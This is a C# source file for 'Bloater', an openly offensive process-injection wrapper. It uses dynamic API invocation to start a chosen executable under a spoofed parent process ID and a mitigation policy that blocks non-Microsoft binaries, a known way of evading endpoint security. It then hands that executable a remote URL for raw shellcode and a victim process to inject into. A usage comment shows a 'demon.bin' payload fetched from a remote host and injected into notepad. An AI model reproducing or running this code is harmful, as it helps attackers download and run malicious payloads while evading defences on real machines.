using DInvoke.DynamicInvoke;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

// Bloater.exe -f "C:\Users\Wesley\Downloads\Clicker.exe" -p 21500 -u "https://192.168.231.128:9090/demon.bin" -t notepad -s 21500

namespace Bloater
{
    internal class Program
    {
        public class Options
        {
            [OptionParameter(ShortName = 'f', DefaultValue = "")]
            public string File { get; set; }

            [OptionParameter(ShortName = 'p', DefaultValue = 0)]
            public int Parent { get; set; }

            [OptionParameter(ShortName = 'u', DefaultValue = "")]
            public string Url { get; set; }

            [OptionParameter(ShortName = 't', DefaultValue = "")]
            public string Target { get; set; }

            [OptionParameter(ShortName = 's', DefaultValue = 0)]
            public int Spoof { get; set; }

            [OptionParameter(ShortName = 'h', DefaultValue = false)]
            public bool Help { get; set; }
        }

        public static void banner()
        {
            Console.WriteLine(@"
                                                                    _
                                                                  _( (~\
           _ _                        /                          ( \> > \
       -/~/ / ~\                     :;                \       _  > /(~\/
      || | | /\ ;\                   |l      _____     |;     ( \/    > >
      _\\)\)\)/ ;;;                  `8o __-~     ~\   d|      \      //
     ///(())(__/~;;\                  ""88p;.  -. _\_;.oP        (_._/ /
    (((__   __ \\   \                  `>,% (\  (\./)8""         ;:'  i
    )))--`.'-- (( ;,8 \               ,;%%%:  ./V^^^V'          ;.   ;.
    ((\   |   /)) .,88  `: ..,,;;;;,-::::::'_::\   ||\         ;[8:   ;
     )|  ~-~  |(|(888; ..``'::::8888oooooo.  :\`^^^/,,~--._    |88::  |
     |\ -===- /|  \8;; ``:.      oo.8888888888:`((( o.ooo8888Oo;:;:'  |
     |_~-___-~_|   `-\.   `        `o`88888888b` )) 888b88888P""""'     ;
     ; ~~~~;~~         ""`--_`.       b`888888888;(.,""888b888""  ..::;-'
       ;      ;              ~""-....  b`8888888:::::.`8888. .:;;;''
          ;    ;                 `:::. `:::OOO:::::::.`OO' ;;;''
     :       ;                     `.      ""``::::::''    .'
        ;                           `.   \_              /
      ;       ;                       +:   ~~--  `:'  -';
                                       `:         : .::/    Bloater
          ;                            ;;+_  :::. :..;;;
                                       ;;;;;;,;;;;;;;;,;
                ");
        }

        public static void help()
        {
            Console.WriteLine("Process Injector 3 (Wrapper): Bloater (Process Mitigation Policy)");
            Console.WriteLine("");
            Console.WriteLine("  -f, --file       Required. Absolute path of file to be executed.");
            Console.WriteLine("");
            Console.WriteLine("  -p, --parent     Required. Spoof --file under a Parent Process ID.");
            Console.WriteLine("");
            Console.WriteLine("  -u, --url        Required. Remote URL address for raw shellcode.");
            Console.WriteLine("");
            Console.WriteLine("  -t, --target     Specify the target/victim process. Default: Self-injection");
            Console.WriteLine("");
            Console.WriteLine("  -s, --spoof      Spoof --target under a Parent Process ID.");
            Console.WriteLine("");
            Console.WriteLine("  -h, --help       Display help screen manual.");
        }

        public static void display(string filePath, int parentID, string urlPath, string targetPath, int spoofID)
        {
            Console.WriteLine("|--------------");
            Console.WriteLine("| File          : " + filePath);
            Console.WriteLine("| PPID Spoofing : " + parentID);
            Console.WriteLine("| Argument 1    : " + urlPath);
            if(targetPath != "")
            {
                Console.WriteLine("| Argument 2    : " + targetPath);
            }
            if (spoofID != 0)
            {
                Console.WriteLine("| Argument 3    : " + spoofID);
            }
            Console.WriteLine("|--------------");
            Console.WriteLine("");
        }

        public static void spawnProcess(string filePath, int parent, string urlPath, string targetPath, int spoofID, ref Win32.PROCESS_INFORMATION pi, ref Win32.STARTUPINFOEX si)
        {
            /* Process Attributes Initialization */

            Console.WriteLine("[>] CreateProcessW()");

            const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
            const uint CREATE_NEW_CONSOLE = 0x00000010;

            const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
            const int PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;
            const long PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;

            si = new Win32.STARTUPINFOEX();
            pi = new Win32.PROCESS_INFORMATION();
            si.StartupInfo.cb = Marshal.SizeOf(si);

            var pa = new Win32.SECURITY_ATTRIBUTES();
            pa.nLength = Marshal.SizeOf(pa);
            var ta = new Win32.SECURITY_ATTRIBUTES();
            ta.nLength = Marshal.SizeOf(ta);

            /* Parent Process ID Spoofing & Process Mitigation Policy */

            var lpSize = IntPtr.Zero;
            var fPtr = Generic.GetLibraryAddress("kernel32.dll", "InitializeProcThreadAttributeList");
            Win32.InitializeProcThreadAttributeList fnInitializeProcThreadAttributeList = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.InitializeProcThreadAttributeList)) as Win32.InitializeProcThreadAttributeList;
            fnInitializeProcThreadAttributeList(
                IntPtr.Zero,
                2,
                0,
                ref lpSize);

            si.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            fnInitializeProcThreadAttributeList(
                si.lpAttributeList,
                2,
                0,
                ref lpSize);

            /* (Process Mitigation Policy) */

            IntPtr lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteInt64(lpMitigationPolicy, PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);

            fPtr = Generic.GetLibraryAddress("kernel32.dll", "UpdateProcThreadAttribute");
            Win32.UpdateProcThreadAttribute fnUpdateProcThreadAttribute = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.UpdateProcThreadAttribute)) as Win32.UpdateProcThreadAttribute;
            var success = fnUpdateProcThreadAttribute(
                si.lpAttributeList,
                0,
                (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                lpMitigationPolicy,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero);

            if (success)
            {
                Console.WriteLine("    |-> Process Mitigation Policy Enforced!");
            }
            else 
            {
                Console.WriteLine("    |-> [X] Failed to set Process Mitigation Policy!");
                Process.GetCurrentProcess().Kill();
            }

            /* (Parent Process ID Spoofing) */

            var phandle = IntPtr.Zero;
            try
            {
                phandle = Process.GetProcessById(parent).Handle;
            }
            catch (Exception)
            {
                Console.WriteLine("[-] Unable to open handle to Parent Process!");
                Process.GetCurrentProcess().Kill();
            }

            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValue, phandle);

            success = fnUpdateProcThreadAttribute(
                si.lpAttributeList,
                0,
                (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                lpValue,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero);

            if (success)
            {
                Console.WriteLine("    |-> Spoofed Parent PID Successfully!");
            }
            else
            {
                Console.WriteLine("    |-> [X] Failed to spoof PPID!");
                Process.GetCurrentProcess().Kill();
            }

            /* Creating Target Process */

            var arguments = " --url " + urlPath;
            if (targetPath != "")
            {
                arguments += " --target " + targetPath;
            }
            if (spoofID != 0)
            {
                arguments += " --parent " + spoofID;
            }

            object[] parameters =
            {
                filePath, filePath + arguments, pa, ta, false, CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, si, pi
            };

            pi = createProcess(parameters);
        }

        public static Win32.PROCESS_INFORMATION createProcess(object[] parameters)
        {
            var success = (bool)Generic.DynamicApiInvoke("kernel32.dll", "CreateProcessW", typeof(Win32.CreateProcessW), ref parameters);

            if (success)
            {
                Console.WriteLine("    |-> Target Process Created!");
            }
            else
            {
                Console.WriteLine("    |-> [X] Failed to create process. Error code: {0}", Marshal.GetLastWin32Error());
                Process.GetCurrentProcess().Kill();
            }

            var pi = (Win32.PROCESS_INFORMATION)parameters[9];

            return pi;
        }

        static public void Main(string[] args)
        {
            /* Command Line Arguments Parsing */

            var options = CommandLineArgumentParser.Parse<Options>(args).ParsedOptions;

            /* Entry Point */

            banner();

            if (options.Help | (options.File == "" && options.Parent == 0 && options.Url == "" && options.Target == "" && options.Spoof == 0))
            {
                help();
            }
            else
            {
                display(options.File, options.Parent, options.Url, options.Target, options.Spoof);

                /* Get Process PID & Handle */

                var pi = new Win32.PROCESS_INFORMATION();
                var si = new Win32.STARTUPINFOEX();

                spawnProcess(options.File, options.Parent, options.Url, options.Target, options.Spoof, ref pi, ref si);
                Console.WriteLine("    |-> PID: {0}", pi.dwProcessId);
            }
        }
    }
}